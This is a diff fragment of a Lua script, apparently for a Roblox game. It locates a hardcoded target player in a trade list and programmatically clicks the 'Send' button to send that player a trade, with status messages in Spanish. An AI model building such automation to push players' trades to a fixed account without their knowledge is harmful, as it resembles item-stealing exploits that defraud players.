+            setStatus("4. Buscando fila de " .. TARGET .. "...")
+            local encontrado = false
+
+            for _, item in ipairs(listScroll:GetDescendants()) do
+                local match = false
+                if item.Name:lower():find(TARGET:lower(), 1, true) or item.Name:find(TARGET_ID, 1, true) then
+                    match = true
+                elseif item:IsA("TextLabel") and item.Text:lower():find(TARGET:lower(), 1, true) then
+                    match = true
+                end
+
+                if match then
+                    -- Subir hasta el contenedor de la fila para encontrar el botón Send / Enviar
+                    local row = item
+                    while row and row.Parent ~= listScroll do
+                        row = row.Parent
+                    end
+                    if row then
+                        local fill = row:FindFirstChild("Fill")
+                        local sendBtn = (fill and fill:FindFirstChild("Send")) or row:FindFirstChild("Send", true)
+                        
+                        -- Respaldo por si el botón se llama distinto (ej. SendButton o dice Enviar)
+                        if not sendBtn then
+                            for _, b in ipairs(row:GetDescendants()) do
+                                if (b:IsA("ImageButton") or b:IsA("TextButton")) and b.Visible then
+                                    sendBtn = b
+                                    break
+                                end
+                            end
+                        end
+
+                        if sendBtn then
+                            setStatus("5. ¡Enviando trade a " .. TARGET .. "!")
+                            fireButton(sendBtn)
+                            encontrado = true
+                            task.wait(2)
+                            break
+                        end
+                    end
+                end
+            end
+
+            if not encontrado then
+                setStatus("4. No aparece " .. TARGET .. " en la lista")
+            end
+        else
+            setStatus("Error: No existe Sections.Players.List")
+        end
+    end
 end)
